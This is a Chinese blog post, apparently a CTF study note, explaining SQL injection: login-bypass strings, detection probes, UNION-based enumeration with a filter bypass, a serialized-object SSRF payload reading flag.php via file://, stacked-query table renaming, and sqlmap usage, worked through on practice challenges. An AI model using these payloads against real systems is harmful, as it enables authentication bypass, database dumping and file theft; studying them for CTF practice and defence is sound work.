@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+
+
+<html lang="zh">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>SQL注入中常见的内容 |  welcome to my world</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/bookmark.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-SQL注入中的常见内容"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SQL注入中常见的内容
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/04/12/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%86%85%E5%AE%B9/" class="article-date">
+  <time datetime="2024-04-12T07:31:58.242Z" itemprop="datePublished">2024-04-12</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">7 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><font color=red>注入原理如下</font><br><img src="/pic/usql/sql.png"><br>语句中利用username和password来验证用户身份，但是若采取非法输入？username&#x3D;’ or 1&#x3D;’1’&amp;password&#x3D;’11111’。则会导致SQL语句的闭合，跳过密码的验证操作，同时还可以在传递的参数最后加入SQL语句注释符#或者–来截断后续语句的运行，从而达到指令的非法执行。</p>
+<h2 id="1、SQL注入的判断"><a href="#1、SQL注入的判断" class="headerlink" title="1、SQL注入的判断  "></a><strong><font size=3>1、SQL注入的判断</font></strong>  </h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(1)最为经典的单引号判断法，参数后面加单引号：？id&#x3D;1’，页面返回错误，存在SQL注入<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2)数字型SQL注入判断：？id&#x3D;x and 1&#x3D;1页面显示正常，？id&#x3D;x and 1&#x3D;2页面显示错误<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(3)字符型SQL注入判断：？id&#x3D;x’ and ‘1’&#x3D;’1页面正常，？id&#x3D;1’ and ‘1’&#x3D;’2页面错误<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(4)万能密码：？id&#x3D;x’ or ‘1’&#x3D;’1   </p>
+<h2 id="2、联合查询注入"><a href="#2、联合查询注入" class="headerlink" title="2、联合查询注入"></a><strong><font size=3>2、联合查询注入</font></strong></h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（1）union操作符用于合并两个或多个SQL语句集合起来。一般与order  by语句配合使用<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（2）先测试字段长度：a’ order by1#% 、a’ order by2#% 、a’ order by3#% 、a’ order by4#%，当测试到：a’ order by 4#% 时：出现页面错误，那么可以确定，查询的字段长度为3。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（4）构造语句：a’ union select database(),user(),version()#%   </p>
+<p><strong><font size=2>2.1、联合查询注入例子（功防世界Fakebook）</font></strong>  </p>
+<p><img src="/pic/usql/usql1.png"><br>通过join按钮创建一个账户<br><img src="/pic/usql/usql2.png"><br>猜测存在SQL注入漏洞<br><img src="/pic/usql/usql3.png"><br>判断出为整数型注入(1 and 1&#x3D;2报错)<br><img src="/pic/usql/usql4.png"><br>尝试联合查询注入<code>http://61.147.171.105:56102/view.php?no=1%20order%20by%205#</code>出错，一共四列）<br>查询数据库<code>http://61.147.171.105:56102/view.php?no=1%20union%20select%20databases();#</code><br><img src="/pic/usql/usql5.png"><br>查询被过滤，利用&#x2F;**&#x2F;绕过<code>http://61.147.171.105:56102/view.php?no=1%20union/**/select%201,2,3,4;#</code><br><img src="/pic/usql/usql6.png"><br>判断显示位为第二位<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,2,3,4;#</code>（传递的no值必须不为显示位的值）<br><img src="/pic/usql/usql7.png"><br>爆库为fakebook<code>（http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,database(),3,4;#）</code><br><img src="/pic/usql/usql8.png"><br>列出库中表<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.TABLES%20where%20table_schema=%27fakebook%27;#</code><br><img src="/pic/usql/usql9.png"><br>列出表中字段<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27;#</code><br><img src="/pic/usql/usql10.png"><br>查看data字段中值<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(data),3,4%20from%20users;#</code><br><img src="/pic/usql/usql11.png"><br>这一段话是序列化的字符串，2.看文中的提示&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php,我们也可以去猜测flag.php有可能在统一文件夹下，如&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  </p>
+<p>访问robots.txt文件后可获取源码,其中<code>function get($url)</code>函数中cuit_init()用来初始化一个curl会话，curl可以使用file伪协议读取文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">		class UserInfo</span><br><span class="line">	&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"> </span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();   #初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close() 函数使用。 </span><br><span class="line"> </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); #curl_setopt — 设置一个cURL传输选项。 CURLOPT_URL需要获取的URL地址，也可以在curl_init()函数中设置</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  # CURLOPT_RETURNTRANSFER 	将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。 </span><br><span class="line">        $output = curl_exec($ch);  #执行一个cURL会话</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);#//抓取URL并把它传递给浏览器，CURLINFO_HTTP_CODE最后一个收到的HTTP代码 </span><br><span class="line">        if($httpCode == 404) &#123;  </span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);// 关闭cURL资源，并且释放系统资源</span><br><span class="line"> </span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">结合以上代码我们可以知道，flag可能在/var/www/html/flag.php且传入的参数被序列化了且传入的变量有$name、$age、$blog,且我们需要用到伪协议file:///。最终们要构建的payload，满足这些条件的代码如下：</span><br></pre></td></tr></table></figure>
+
+<pre><code>&lt;?php
+class UserInfo
+&#123;
+public $name = &quot;123&quot;;  #任意
+public $age = 123;      #任意
+public $blog = &quot;file:///var/www/html/flag.php&quot;;
+&#125;
+$a=new UserInfo();
+echo(serialize($a)); 
+?&gt;
+</code></pre>
+<p>运行后可得<br>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ </p>
+<p>最后一步构建的paylod为<br><code>http://111.200.241.244:52692/view.php?no=2union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; #</code>（传入的序列化参数需要加上  ‘’）<br><img src="/pic/usql/usql12.png"><br>打开源代码查看base64编码的flag<br><img src="/pic/usql/usql13.png"><br>OR<br>猜测flag文件路径，利用load_file直接读取flag（<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,load_file(%27/var/www/html/flag.php%27),3,4;#</code>）<br><img src="/pic/usql/usql14.png"><br>附加数据库知识：<br><img src="/pic/usql/usql15.png">  </p>
+<h2 id="3、堆叠注入"><a href="#3、堆叠注入" class="headerlink" title="3、堆叠注入"></a><strong><font size=3>3、堆叠注入</font></strong></h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，通过;分隔，成堆的执行sql语句。  </p>
+<p>堆叠注入例题：<br><img src="/pic/dsql/dsql1.png"><br>确定存在字符型注入漏洞，同时利用联合查询注入获得返回界面：<br><img src="/pic/dsql/dsql2.png"><br>由于未过滤“；”,采取堆叠注入<br><img src="/pic/dsql/dsql3.png"><br>查表<code>1’;use supersqli;show tables;#</code><br><img src="/pic/dsql/dsql4.png"><br>查列<code>1&#39;;use supersqli;show columns from &#39;1919810931114514&#39;;#</code>接下来应该<code>select flag from &#39;1919810931114514&#39;</code>，但是select被过滤。查看words表发现其为返回数据的表，则可将flag所在表名称修改为words，即可获取flag:<br><code>1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);# </code><br>利用万能密码<code>1&#39; or 1=1#</code>就查出来了<br><img src="/pic/dsql/dsql5.png">  </p>
+<h2 id="4、sqlmap注入"><a href="#4、sqlmap注入" class="headerlink" title="4、sqlmap注入"></a><strong><font size=3>4、sqlmap注入</font></strong></h2><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。  </p>
+<p>sqlmap注入例题：<br><img src="/pic/ssql/ssql1.png"><br>输入hello，页面正常显示内容<br><img src="/pic/ssql/ssql2.png"><br>输入hello’，页面显示空白，猜测存在字符型SQL注入漏洞<br><img src="/pic/ssql/ssql3.png"><br>检查网页代码发现页面使用POST请求用search参数发送了数据<br><img src="/pic/ssql/ssql4.png"><br>利用BP抓包将请求复制到test.txt文件中，利用sqlmap的命令sqlmap.py -r test.txt，将以POST请求检测注入<br><img src="/pic/ssql/ssql5.png"><br>利用sqlmap检测所存在的数据库<br><img src="/pic/ssql/ssql6.png"><br>获取数据库表<br><img src="/pic/ssql/ssql7.png"><br>获取表中列<br><img src="/pic/ssql/ssql8.png"><br>获取列的值<br><img src="/pic/ssql/ssql9.png">  </p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/04/12/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%86%85%E5%AE%B9/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/04/18/CTF%20Web%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%86%85%E5%AE%B9/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            CTF Web中的常见内容
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/03/29/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">linux常用命令</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024
+        <i class="ri-heart-fill heart_icon"></i> KXB
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/ayer-side.png" alt="welcome to my world"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
